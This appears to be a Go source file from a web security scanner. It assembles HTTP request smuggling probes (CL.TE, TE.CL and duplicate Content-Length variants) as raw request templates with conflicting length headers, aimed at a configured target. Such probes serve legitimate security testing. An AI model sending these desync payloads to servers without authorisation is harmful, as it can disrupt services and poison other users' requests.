package pkg

import (
	"fmt"
	"strings"
)

func init() {

}

func generateHeaderString() string {
	headers := ""
	userAgent := useragent
	for _, h := range Config.Headers {
		h = strings.TrimSuffix(h, "\r")
		h = strings.TrimSpace(h)
		if h == "" {
			continue
		} else if !strings.Contains(h, ":") {
			msg := "Specified header" + h + "doesn't contain a : and will be skipped"
			Print(msg, NoColor)
			continue
		} else {
			headers += h + "\r\n"

			hSplitted := strings.SplitN(h, ":", 2)
			hSplitted[0] = strings.TrimSpace(hSplitted[0])
			hSplitted[1] = strings.TrimSpace(hSplitted[1])

			if strings.EqualFold(hSplitted[0], "User-Agent") {
				userAgent = hSplitted[1]
			}
		}
	}
	// if its the same, the useragent wasnt added yet
	if userAgent == useragent {
		headers += "User-Agent: " + useragent + "\r\n"
	}

	return headers
}

/* Run CLTE before TECL. Dont test for TECL if CLTE already works! */
func CLTE(headers string) string {
	payload := fmt.Sprintf(""+
		"POST %s HTTP/1.1\r\n"+ //			 POST /about HTTP/1.1
		"Host: %s\r\n"+ //					 Host: example.com
		"%s"+ //							 *Additional Headers generated*
		"Transfer-Encoding: chunked\r\n"+ // Transfer-Encoding: chunked
		"Content-Length: 4\r\n"+ //			 Content-Length: 4
		"\r\n"+ //
		"1\r\n"+ //							 1
		"Z\r\n"+ //							 Z
		"Q\r\n"+ //							 Q
		"", Config.Website.Url.Path, Config.Website.BaseUrlStr, headers)

	return payload
}

func TECL(headers string) string {
	payload := fmt.Sprintf(""+
		"POST %s HTTP/1.1\r\n"+ //			 POST /about HTTP/1.1
		"Host: %s\r\n"+ //					 Host: example.com
		"%s"+ //							 *Additional Headers generated*
		"Transfer-Encoding: chunked\r\n"+ // Transfer-Encoding: chunked
		"Content-Length: 6\r\n"+ //			 Content-Length: 6
		"\r\n"+ //
		"0\r\n"+ //							 0
		"\r\n"+ //
		"X\r\n"+ //							 X
		"", Config.Website.Url.Path, Config.Website.BaseUrlStr, headers)

	return payload
}

func CLCL(headers string) string {
	payload := fmt.Sprintf(""+
		"POST %s HTTP/1.1\r\n"+ //			 POST /about HTTP/1.1
		"Host: %s\r\n"+ //					 Host: example.com
		"%s"+ //							 *Additional Headers generated*
		"Content-Length: 4\r\n"+ // 		 Content-Length: 4
		"Content-Length: 6\r\n"+ //			 Content-Length: 6
		"\r\n"+ //
		"M\r\n"+ //							 M
		"1\r\n"+ //							 1
		"0\r\n"+ //							 0
		"X\r\n"+ //							 X
		"", Config.Website.Url.Path, Config.Website.BaseUrlStr, headers)

	return payload
}

func CLCL2(headers string) string {
	payload := fmt.Sprintf(""+
		"POST %s HTTP/1.1\r\n"+ //			 POST /about HTTP/1.1
		"Host: %s\r\n"+ //					 Host: example.com
		"%s"+ //							 *Additional Headers generated*
		"Content-Length: 6\r\n"+ //			 Content-Length: 6
		"Content-Length: 4\r\n"+ //			 Content-Length: 4
		"\r\n"+ //
		"M\r\n"+ //							 M
		"1\r\n"+ //							 1
		"0\r\n"+ //							 0
		"X\r\n"+ //							 X
		"", Config.Website.Url.Path, Config.Website.BaseUrlStr, headers)

	return payload
}
